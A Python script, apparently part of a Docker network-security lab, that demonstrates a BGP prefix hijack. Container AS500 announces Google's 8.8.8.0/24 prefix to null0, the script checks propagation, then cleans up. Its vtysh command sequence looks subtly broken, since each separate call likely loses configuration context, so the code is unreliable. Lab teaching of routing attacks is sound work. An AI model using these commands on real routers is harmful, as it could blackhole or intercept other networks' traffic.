#!/usr/bin/env python3
import subprocess
import time
from datetime import datetime

class BGPAttackSimulator:
    def __init__(self):
        self.as_ips = {
            'as100': '172.20.0.10',
            'as200': '172.20.0.20', 
            'as300': '172.20.0.30',
            'as400': '172.20.0.40',
            'as500': '172.20.0.50'
        }
        
    def log(self, message):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
    
    def show_bgp_status(self):
        print("\n🔍 BGP Status Check")
        print("=" * 40)
        
        for as_name in ['as100', 'as200', 'as300', 'as400', 'as500']:
            try:
                result = subprocess.run(['docker', 'exec', '-t', as_name, 'vtysh', '-c', 'show ip bgp summary'],
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0 and 'Established' in result.stdout:
                    established = result.stdout.count('Established')
                    print(f"✓ {as_name}: {established} BGP sessions established")
                else:
                    print(f"⚠️  {as_name}: BGP not ready")
            except:
                print(f"❌ {as_name}: Connection failed")
    
    def prefix_hijack_demo(self):
        print("\n🚨 STARTING PREFIX HIJACK ATTACK")
        print("AS500 will hijack Google DNS (8.8.8.0/24) from AS300")
        print("=" * 50)
        
        # Show baseline
        self.log("📊 Baseline - checking routes to 8.8.8.0/24")
        subprocess.run(['docker', 'exec', '-t', 'as200', 'vtysh', '-c', 'show ip bgp'])
        
        # Inject attack
        self.log("💉 AS500: Injecting hijacked prefix 8.8.8.0/24")
        
        attack_commands = [
            ['docker', 'exec', '-i', 'as500', 'vtysh', '-c', 'configure terminal'],
            ['docker', 'exec', '-i', 'as500', 'vtysh', '-c', 'ip route 8.8.8.0/24 null0'],
            ['docker', 'exec', '-i', 'as500', 'vtysh', '-c', 'router bgp 65500'],
            ['docker', 'exec', '-i', 'as500', 'vtysh', '-c', 'network 8.8.8.0/24'],
            ['docker', 'exec', '-i', 'as500', 'vtysh', '-c', 'end'],
            ['docker', 'exec', '-i', 'as500', 'vtysh', '-c', 'write']
        ]
        
        for cmd in attack_commands:
            subprocess.run(cmd)
        
        self.log("✅ Attack route injected")
        
        # Force BGP update
        self.log("🔄 Forcing BGP updates...")
        for as_name in ['as300', 'as500']:
            subprocess.run(['docker', 'exec', '-i', as_name, 'vtysh', '-c', 'clear ip bgp *'])
        
        # Monitor attack
        self.log("📈 Monitoring attack propagation (30 seconds)...")
        time.sleep(30)
        
        # Show attack results
        self.log("🎯 Attack Results - checking AS200 routing table:")
        subprocess.run(['docker', 'exec', '-t', 'as200', 'vtysh', '-c', 'show ip bgp | grep 8.8.8'])
        
        # Cleanup
        self.log("🧹 Cleaning up attack...")
        cleanup_commands = [
            ['docker', 'exec', '-i', 'as500', 'vtysh', '-c', 'configure terminal'],
            ['docker', 'exec', '-i', 'as500', 'vtysh', '-c', 'no ip route 8.8.8.0/24 null0'],
            ['docker', 'exec', '-i', 'as500', 'vtysh', '-c', 'router bgp 65500'],
            ['docker', 'exec', '-i', 'as500', 'vtysh', '-c', 'no network 8.8.8.0/24'],
            ['docker', 'exec', '-i', 'as500', 'vtysh', '-c', 'end']
        ]
        
        for cmd in cleanup_commands:
            subprocess.run(cmd)
        
        subprocess.run(['docker', 'exec', '-i', 'as500', 'vtysh', '-c', 'clear ip bgp *'])
        
        self.log("🏁 PREFIX HIJACK ATTACK COMPLETE!")

def main():
    simulator = BGPAttackSimulator()
    
    print("🚀 NetSecSim BGP Attack Simulator")
    print("=" * 40)
    
    while True:
        print("\nOptions:")
        print("1. Show BGP Status")
        print("2. Run Prefix Hijack Attack")
        print("0. Exit")
        
        choice = input("\nSelect (0-2): ").strip()
        
        if choice == '0':
            break
        elif choice == '1':
            simulator.show_bgp_status()
        elif choice == '2':
            simulator.prefix_hijack_demo()
        else:
            print("Invalid choice!")
    
    print("👋 Goodbye!")

if __name__ == "__main__":
    main()
